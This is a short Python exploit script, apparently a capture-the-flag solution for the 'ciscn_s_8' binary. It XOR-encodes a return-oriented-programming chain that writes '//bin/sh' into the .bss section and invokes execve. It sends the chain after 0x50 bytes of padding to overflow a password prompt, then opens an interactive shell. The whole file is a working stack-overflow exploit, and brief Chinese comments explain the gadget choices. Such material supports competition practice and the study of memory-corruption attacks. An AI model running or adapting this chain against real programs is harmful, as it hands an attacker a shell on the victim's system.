import sgtlibc
from sgtlibc.gamebox import *
set_config(GameBoxConfig(
    is_local=True,
    file='./ciscn_s_8',
    remote='192.168.2.0:8888',
    auto_load=True,
    auto_show_rop=True,
    auto_show_summary=True,
    auto_start_game=True,
    auto_load_shell_str=True,
    auto_show_symbols=True
))

s = sgtlibc.Searcher()
elf = client.elf


def encode(s: bytes):
    res = b''
    for i in range(len(s)):
        res += (s[i] ^ 0x66).to_bytes(1, 'little')
    return res

# 基于move [rxx], rxx 实现直接传入/bin/sh

bss = 0x06BD000  # 取一个没有被使用的区域
mov_rax_inrsi = 0x47f7b1 # 注意需要找一个后续会控制的寄存器

payload = p00(elf.rop['rsi']) + p00(bss)
payload += p00(elf.rop['rax']) + b'//bin/sh'  # padding to 8 bytes
payload += p00(mov_rax_inrsi)  # 找一个 mov [rsi], rax
payload += p00(elf.rop['rdi']) + p00(bss) # /bin/sh to bss 
payload += p00(elf.rop['rdx_rsi']) + p00(0) * 2
payload += p00(elf.rop['rax']) + p00(0x3B) + p00(elf.rop['syscall_rdx_rsi'])

ru("Please enter your Password: \n")
payload = b'a'*0x50 + encode(payload)
sl(payload)
interactive()
